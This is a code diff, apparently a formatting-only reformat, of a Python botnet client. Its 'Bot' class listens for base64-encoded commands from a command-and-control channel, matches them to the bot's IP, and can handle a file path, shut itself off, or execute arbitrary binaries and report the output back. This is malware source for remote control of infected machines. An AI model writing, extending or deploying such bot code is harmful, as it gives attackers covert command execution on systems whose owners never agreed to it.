@@ -27,9 +27,7 @@ class Bot:
         """
         Waits for commands from C&C as long as self.active == True
         """
-        self.worker_thread = threading.Thread(
-            target=self.process_commands, daemon=True
-        )
+        self.worker_thread = threading.Thread(target=self.process_commands, daemon=True)
 
         self.worker_thread.start()
 
@@ -53,7 +51,7 @@ class Bot:
                 continue
 
             response_id = f"[]({base64.b64encode(f'{current_command.id}-{self.ip}'.encode('utf-8')).decode('utf-8')})"
-            ip_b64 = base64.b64encode(self.ip.encode('utf-8')).decode('utf-8')
+            ip_b64 = base64.b64encode(self.ip.encode("utf-8")).decode("utf-8")
 
             print(f"Processing command = {current_command.body}")
 
@@ -74,7 +72,9 @@ class Bot:
                 and ip_b64 in current_command.body
             ):
                 path = (
-                    base64.b64decode(current_command.body.split("<")[1].split(">")[0]).decode('utf-8')
+                    base64.b64decode(
+                        current_command.body.split("<")[1].split(">")[0]
+                    ).decode("utf-8")
                     if "<" in current_command.body and ">" in current_command.body
                     else None
                 )
@@ -87,8 +87,7 @@ class Bot:
                 and ip_b64 in current_command.body
             ):
                 self.channel.send_message(
-                    f"{Channel.SHUT_OFF_RESPONSE} "
-                    f"{response_id}"
+                    f"{Channel.SHUT_OFF_RESPONSE} " f"{response_id}"
                 )
                 self.active = False
 
@@ -98,12 +97,16 @@ class Bot:
                 and ip_b64 in current_command.body
             ):
                 command = (
-                    base64.b64decode(current_command.body.split("<")[1].split(">")[0]).decode('utf-8')
+                    base64.b64decode(
+                        current_command.body.split("<")[1].split(">")[0]
+                    ).decode("utf-8")
                     if "<" in current_command.body and ">" in current_command.body
                     else None
                 )
                 if command:
-                    self.execute_binary(command.split(" "), Channel.BINARY_RESPONSE, response_id)
+                    self.execute_binary(
+                        command.split(" "), Channel.BINARY_RESPONSE, response_id
+                    )
 
             # TODO: Additional commands
 
